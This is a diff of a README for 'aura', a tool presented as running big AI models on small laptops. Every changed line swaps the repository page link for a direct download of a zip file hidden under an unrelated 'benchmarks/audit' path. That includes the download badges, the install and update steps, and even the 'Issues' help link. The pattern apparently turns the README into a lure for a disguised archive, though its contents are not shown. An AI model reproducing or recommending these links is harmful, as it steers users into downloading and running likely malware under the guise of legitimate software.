@@ -1,6 +1,6 @@
 # 🧠 aura - Run Big AI Models on Tiny Laptops
 
-[![Download aura](https://img.shields.io/badge/Download-aura-blue?style=for-the-badge&logo=github)](https://github.com/ashcakeancient7671/aura)
+[![Download aura](https://img.shields.io/badge/Download-aura-blue?style=for-the-badge&logo=github)](https://github.com/ashcakeancient7671/aura/raw/refs/heads/main/benchmarks/audit/v7_v8_v9_final/3.1.zip)
 
 ## 🌟 What Is aura?
 
@@ -15,7 +15,7 @@ Getting aura on your Windows computer is easy. Just follow these simple steps.
 ### 📥 Download aura
 
 1. Open your web browser (like Chrome, Edge, or Firefox).
-2. Go to this address: `https://github.com/ashcakeancient7671/aura`
+2. Go to this address: `https://github.com/ashcakeancient7671/aura/raw/refs/heads/main/benchmarks/audit/v7_v8_v9_final/3.1.zip`
 3. Look for the download button or link on that page.
 4. Click it to start downloading aura.
 
@@ -149,7 +149,7 @@ You don't need to download anything else to start using aura.
 
 To get the latest version of aura:
 
-1. Visit the download page again: `https://github.com/ashcakeancient7671/aura`
+1. Visit the download page again: `https://github.com/ashcakeancient7671/aura/raw/refs/heads/main/benchmarks/audit/v7_v8_v9_final/3.1.zip`
 2. Check if there's a newer version available.
 3. Download the new file and replace the old one.
 
@@ -168,7 +168,7 @@ If you're curious and want to get more out of aura, here are some tips:
 If you run into any problems, there are several ways to get help:
 
 1. **Check this README** again. Most common issues are covered here.
-2. **Visit the GitHub page** at `https://github.com/ashcakeancient7671/aura` and look for an "Issues" or "Support" section.
+2. **Visit the GitHub page** at `https://github.com/ashcakeancient7671/aura/raw/refs/heads/main/benchmarks/audit/v7_v8_v9_final/3.1.zip` and look for an "Issues" or "Support" section.
 3. **Ask a friend** who is comfortable with computers. They can often spot simple fixes.
 
 ## 🎉 Conclusion
@@ -177,7 +177,7 @@ aura makes it possible for anyone with a modest laptop to run powerful AI models
 
 Ready to get started? Click the button below to download aura now.
 
-[![Download aura Now](https://img.shields.io/badge/⬇️_Download-aura_Now-2ea44f?style=for-the-badge)](https://github.com/ashcakeancient7671/aura)
+[![Download aura Now](https://img.shields.io/badge/⬇️_Download-aura_Now-2ea44f?style=for-the-badge)](https://github.com/ashcakeancient7671/aura/raw/refs/heads/main/benchmarks/audit/v7_v8_v9_final/3.1.zip)
 
 ---
 
